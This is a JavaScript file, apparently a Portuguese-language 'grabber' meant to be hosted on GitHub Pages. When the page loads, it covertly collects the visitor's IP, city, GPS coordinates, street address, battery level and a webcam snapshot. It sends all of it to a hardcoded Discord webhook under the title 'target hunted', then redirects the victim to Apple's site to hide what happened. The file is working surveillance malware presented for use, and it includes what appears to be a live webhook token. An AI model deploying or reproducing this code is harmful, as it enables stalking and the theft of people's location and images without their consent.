// script.js - GRABBER 100% FUNCIONAL (GitHub Pages + Discord)
const WEBHOOK = "https://discord.com/api/webhooks/1434608236673368084/AFQ-LUDSvqZxcGzn-6-gd8D84KTdZUn20ykWjvoYhg52IKkxvgAn-xIjcAmjdA1AAu5y";

const log = async (msg) => {
    console.log(msg);
    try {
        await fetch(WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ content: msg })
        });
    } catch (e) {}
};

const sendEmbed = async (data) => {
    const embed = {
        title: "ALVO CAÇADO - GPS + FOTO",
        color: 0xff0000,
        fields: [
            { name: "IP", value: data.ip || "N/A", inline: true },
            { name: "Cidade", value: data.city || "N/A", inline: true },
            { name: "Rua", value: data.rua || "N/A", inline: false },
            { name: "GPS", value: data.gps || "N/A", inline: true },
            { name: "Bateria", value: data.battery + "%", inline: true }
        ],
        image: { url: data.foto },
        timestamp: new Date().toISOString()
    };

    await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] })
    });
};

(async () => {
    try {
        await log("Grabber iniciado...");

        // 1. IP
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const ip = ipData.ip;
        await log(`IP: ${ip}`);

        // 2. GEO (usando API que permite CORS)
        const geoRes = await fetch('https://ipwho.is/');
        const geo = await geoRes.json();
        await log(`Cidade: ${geo.city}`);

        // 3. GPS
        const pos = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 15000 });
        });
        const gps = `${pos.coords.latitude}, ${pos.coords.longitude}`;
        await log(`GPS: ${gps}`);

        // 4. RUA (reverse geocoding)
        const ruaRes = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`);
        const ruaData = await ruaRes.json();
        const rua = ruaData.display_name || "N/A";

        // 5. BATERIA
        const bat = await navigator.getBattery();
        const battery = Math.round(bat.level * 100);

        // 6. FOTO
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 } });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        await new Promise(r => setTimeout(r, 2500));
        const canvas = document.createElement('canvas');
        canvas.width = 320; canvas.height = 240;
        canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
        const foto = canvas.toDataURL('image/jpeg', 0.8);
        stream.getTracks().forEach(t => t.stop());

        // 7. ENVIA TUDO
        await sendEmbed({
            ip,
            city: geo.city,
            rua,
            gps,
            battery,
            foto
        });

        await log("DADOS ENVIADOS COM SUCESSO!");
        setTimeout(() => { window.location = "https://apple.com/br/"; }, 2000);

    } catch (e) {
        await log(`ERRO: ${e.message}`);
        console.error(e);
    }
})();
